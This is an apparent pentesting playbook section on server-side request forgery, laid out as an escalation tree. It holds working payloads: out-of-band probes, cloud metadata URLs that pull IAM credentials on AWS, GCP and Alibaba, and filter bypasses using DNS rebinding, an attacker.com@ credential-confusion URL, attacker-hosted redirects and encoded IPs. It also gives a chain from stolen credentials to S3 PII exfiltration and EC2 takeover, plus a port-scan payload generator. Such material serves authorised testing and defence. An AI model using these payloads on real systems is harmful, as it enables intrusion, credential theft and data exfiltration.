## SSRF & Internal Network Exposure

- `->` **[Primary Probe]** Identify all URL-accepting parameters (webhooks, avatar fetch, PDF renderer, integrations, export-to-PDF); inject `http://<interactsh-host>/ssrf-test`; monitor for DNS/HTTP ping [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11012433/)
  - `->` **[Signal: OOB HTTP ping received]** → Escalate: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDSv1), `http://metadata.google.internal/computeMetadata/v1/` (GCP), `http://100.100.100.200/latest/meta-data/` (Alibaba)
  - `->` **[Dead End: HTTP blocked, only DNS resolves]** → DNS rebinding: register domain that resolves to `127.0.0.1` after TTL expires; trigger re-fetch after bind
  - `->` **[Dead End: URL scheme restricted to https]** → Protocol smuggling: `https://attacker.com@169.254.169.254/` — test credential confusion parsing; try `http://[::ffff:169.254.169.254]/`
  - `->` **[Dead End: IP blocklist — loopback/link-local blocked]** → Bypass via redirects: host `302 → http://127.0.0.1:8080` on attacker server; also try decimal encoding `http://2130706433/`, octal `http://0177.0.0.1/`
  - `->` **[Dead End: Redirect following disabled]** → SSRF via DNS: `http://localtest.me/` (resolves to 127.0.0.1); `http://1.1.1.1.nip.io` variants
  - `->` **[Data Chaining]** IMDSv1 IAM creds → AWS CLI lateral movement → S3 bucket listing → PII exfiltration or EC2 instance takeover [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11415292/)

**Internal Port Scanning via SSRF:**
```bash
# One-liner: Generate SSRF port-scan payload list
for p in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do echo "http://127.0.0.1:$p/"; done > /vulns/target/payloads/ssrf-ports.txt
```

***

